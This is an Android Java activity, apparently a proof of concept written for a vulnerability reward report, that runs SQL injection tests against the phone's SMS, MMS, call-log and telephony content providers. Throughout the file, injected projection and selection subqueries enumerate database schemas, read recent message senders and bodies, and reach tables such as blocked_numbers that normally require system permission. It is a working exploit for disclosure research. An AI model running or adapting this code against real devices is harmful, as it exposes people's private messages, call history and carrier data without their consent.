package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SmsSqliActivity extends Activity {
    private static final String TAG = "SmsSqli";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(7);
        logView.setText("SMS/Telephony Provider SQL Injection PoC\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        testSmsBasicAccess();
        testSmsProjectionInjection();
        testSmsSelectionInjection();
        testMmsAccess();
        testTelephonyProviders();
        testCallLogSqli();
        log("\n=== ALL TESTS COMPLETE ===");
    }

    private void testSmsBasicAccess() {
        log("=== TEST 1: Basic SMS access ===");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms"),
                new String[]{"_id", "address", "body", "date"},
                null, null, "date DESC LIMIT 3"
            );
            if (c != null) {
                log("SMS messages: " + c.getCount());
                while (c.moveToNext()) {
                    log("  #" + c.getLong(0) + " from=" + c.getString(1) + " body=" + shorten(c.getString(2), 50));
                }
                c.close();
            } else {
                log("SMS: null cursor");
            }
        } catch (Exception e) {
            log("SMS: " + e.getClass().getSimpleName() + ": " + shorten(e.getMessage(), 100));
        }
    }

    private void testSmsProjectionInjection() {
        log("\n=== TEST 2: SMS Projection Injection ===");

        // Test sqlite_version
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms"),
                new String[]{"sqlite_version() AS ver"},
                null, null, null
            );
            if (c != null && c.moveToFirst()) {
                log("[VULN] sqlite_version via SMS: " + c.getString(0));
                c.close();
            }
        } catch (Exception e) {
            log("sqlite_version: " + shorten(e.getMessage(), 100));
        }

        // Test schema enumeration
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms"),
                new String[]{"(SELECT group_concat(name) FROM sqlite_master WHERE type='table') AS tables"},
                null, null, null
            );
            if (c != null && c.moveToFirst()) {
                log("[VULN] Schema via SMS: " + c.getString(0));
                c.close();
            }
        } catch (Exception e) {
            log("Schema enum: " + shorten(e.getMessage(), 100));
        }

        // Test cross-table access — can we read MMS data via SMS projection injection?
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms"),
                new String[]{"(SELECT count(*) FROM pdu) AS mms_count"},
                null, null, null
            );
            if (c != null && c.moveToFirst()) {
                log("[VULN] MMS count via SMS injection: " + c.getString(0));
                c.close();
            }
        } catch (Exception e) {
            log("MMS cross-table: " + shorten(e.getMessage(), 100));
        }
    }

    private void testSmsSelectionInjection() {
        log("\n=== TEST 3: SMS Selection Injection ===");

        // Blind boolean
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms"),
                new String[]{"_id"},
                "CASE WHEN (SELECT count(*) FROM sqlite_master)>0 THEN 1 ELSE 0 END = 1",
                null, null
            );
            if (c != null) {
                log("[VULN] Selection injection: " + c.getCount() + " rows (subquery executed)");
                c.close();
            }
        } catch (Exception e) {
            log("Selection: " + shorten(e.getMessage(), 100));
        }
    }

    private void testMmsAccess() {
        log("\n=== TEST 4: MMS Provider ===");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://mms"),
                null, null, null, "date DESC LIMIT 3"
            );
            if (c != null) {
                log("MMS messages: " + c.getCount() + " cols=" + c.getColumnCount());
                if (c.getCount() > 0) {
                    StringBuilder cols = new StringBuilder();
                    for (String col : c.getColumnNames()) cols.append(col).append(",");
                    log("  Columns: " + cols);
                }
                c.close();
            }
        } catch (Exception e) {
            log("MMS: " + shorten(e.getMessage(), 100));
        }

        // Test MMS projection injection
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://mms"),
                new String[]{"sqlite_version() AS ver"},
                null, null, null
            );
            if (c != null && c.moveToFirst()) {
                log("[VULN] sqlite_version via MMS: " + c.getString(0));
                c.close();
            }
        } catch (Exception e) {
            log("MMS sqli: " + shorten(e.getMessage(), 100));
        }

        // MMS-SMS conversation provider
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://mms-sms/conversations"),
                null, null, null, null
            );
            if (c != null) {
                log("MMS-SMS conversations: " + c.getCount());
                c.close();
            }
        } catch (Exception e) {
            log("MMS-SMS: " + shorten(e.getMessage(), 100));
        }
    }

    private void testTelephonyProviders() {
        log("\n=== TEST 5: Other Telephony Providers ===");

        String[][] providers = {
            {"content://telephony/carriers", "APN carriers"},
            {"content://telephony/carriers/current", "Current APN"},
            {"content://telephony/carriers/preferapn", "Preferred APN"},
            {"content://telephony/siminfo", "SIM info"},
            {"content://carrier_id/all", "Carrier ID"},
            {"content://carrier_information/carrier_id", "Carrier info"},
        };

        for (String[] p : providers) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(p[0]), null, null, null, null);
                if (c != null) {
                    log("[ACCESSIBLE] " + p[1] + ": rows=" + c.getCount() + " cols=" + c.getColumnCount());
                    if (c.getCount() > 0 && c.moveToFirst()) {
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < Math.min(c.getColumnCount(), 5); i++) {
                            try { sb.append(c.getColumnName(i) + "=" + shorten(c.getString(i), 30) + " "); } catch (Exception ignored) {}
                        }
                        log("  Data: " + sb);
                    }
                    c.close();
                } else {
                    log("[NULL] " + p[1]);
                }
            } catch (SecurityException e) {
                log("[DENIED] " + p[1]);
            } catch (Exception e) {
                log("[ERROR] " + p[1] + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private void testCallLogSqli() {
        log("\n=== TEST 6: Call Log SQL Injection ===");

        // We have READ_CALL_LOG — test projection injection
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://call_log/calls"),
                new String[]{"sqlite_version() AS ver"},
                null, null, null
            );
            if (c != null && c.moveToFirst()) {
                log("[VULN] sqlite_version via CallLog: " + c.getString(0));
                c.close();
            }
        } catch (Exception e) {
            log("CallLog proj: " + shorten(e.getMessage(), 100));
        }

        // Schema
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://call_log/calls"),
                new String[]{"(SELECT group_concat(name) FROM sqlite_master WHERE type='table') AS t"},
                null, null, null
            );
            if (c != null && c.moveToFirst()) {
                log("[VULN] CallLog schema: " + c.getString(0));
                c.close();
            }
        } catch (Exception e) {
            log("CallLog schema: " + shorten(e.getMessage(), 100));
        }

        // Blocked numbers (normally requires system permission)
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://call_log/calls"),
                new String[]{"(SELECT count(*) FROM blocked_numbers) AS bn"},
                null, null, null
            );
            if (c != null && c.moveToFirst()) {
                log("[VULN] Blocked numbers count via CallLog: " + c.getString(0));
                c.close();
            }
        } catch (Exception e) {
            log("CallLog blocked: " + shorten(e.getMessage(), 100));
        }
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
